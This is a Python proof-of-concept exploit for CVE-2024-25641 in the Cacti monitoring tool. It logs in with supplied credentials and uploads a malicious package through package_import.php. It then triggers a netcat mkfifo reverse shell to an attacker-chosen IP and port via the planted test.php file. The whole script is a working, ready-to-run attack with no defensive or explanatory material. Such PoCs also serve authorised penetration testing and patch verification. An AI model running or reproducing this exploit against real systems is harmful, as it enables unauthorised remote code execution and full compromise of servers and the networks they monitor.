
import argparse
import requests
import sys
import re

def check_cacti(url: str) -> bool:
    req = requests.get(url)
    if "Cacti" in req.text:
        return True
    else:
        return False

def login(url: str, username: str, password: str, use_proxy: bool) -> None:
    if check_cacti(url):
        print("Cacti Instance Found!")
    else:
        print("No Cacti Instance was found, exiting....")
        sys.exit(-1)

    proxy = {'http': 'http://127.0.0.1:8080'} if use_proxy else None
    s = requests.Session()
    res = s.get(url, proxies=proxy)
    match = re.search(r'var csrfMagicToken\s=\s"(sid:[a-z0-9]+,[a-z0-9]+)', res.text)
    csrf_magic_token = match.group(1)
    data = {
        '__csrf_magic': csrf_magic_token,
        'action': 'login',
        'login_username': username,
        'login_password': password
    }
    req1 = s.post(url + '/cacti/index.php', data=data, proxies=proxy)
    if 'Console' in req1.text:
        print('Login Successful!')
    else:
        print('Login Failed :(')

    # File upload
    import_package_page = s.get(url + '/cacti/package_import.php', proxies=proxy)
    match = re.search(r'var csrfMagicToken\s=\s"(sid:[a-z0-9]+,[a-z0-9]+)', import_package_page.text)
    csrf_magic_token = match.group(1)
    files = {
        'import_file': ('test.xml.gz', open('test.xml.gz', 'rb'), 'application/x-gzip'),
    }

    data = {
        '__csrf_magic': csrf_magic_token,
        'trust_signer': 'on',
        'data_source_profile': '1',
        'remove_orphans': 'on',
        'replace_svalues': 'on',
        'image_format': '3',
        'graph_height': '200',
        'graph_width': '700',
        'save_component_import': '1',
        'preview_only': 'on',
        'action': 'save'
    }

    upload_file = s.post(url + '/cacti/package_import.php?package_location=0&preview_only=on', files=files, data=data, proxies=proxy)

    data['preview_only'] = ''

    save_file = s.post(url + '/cacti/package_import.php?header=false', data=data, proxies=proxy)
    if save_file.status_code == 200:
        print('Package Import finalized')

def get_shell(url: str, ip: str, port: str, use_proxy: bool) -> None:
    print('Triggering shell..... make sure you\'ve started the listener')
    proxy = {'http': 'http://127.0.0.1:8080'} if use_proxy else None

    # This uses nc mkfifo revshell, change if required
    data = {
        'cmd': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'
    }
    requests.post(url + '/cacti/resource/test.php', data=data, proxies=proxy)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='Cacti CVE-2024-25641 Authenticated Package Upload RCE Proof of Concept (PoC)')
    parser.add_argument('-u', '--user', type=str, required=True, help='Username for login')
    parser.add_argument('-p', '--password', type=str, required=True, help='Password for login')
    parser.add_argument('-i', '--ip', type=str, required=True, help='IP address for reverse shell')
    parser.add_argument('-l', '--port', type=str, required=True, help='Port number for reverse shell')
    parser.add_argument('-url', '--url', type=str, required=True, help='Base URL of the application')
    parser.add_argument('--proxy', action='store_true', help='Enable proxy usage (default: http://127.0.0.1:8080)')
    args = parser.parse_args()

    login(args.url, args.user, args.password, args.proxy)
    get_shell(args.url, args.ip, args.port, args.proxy)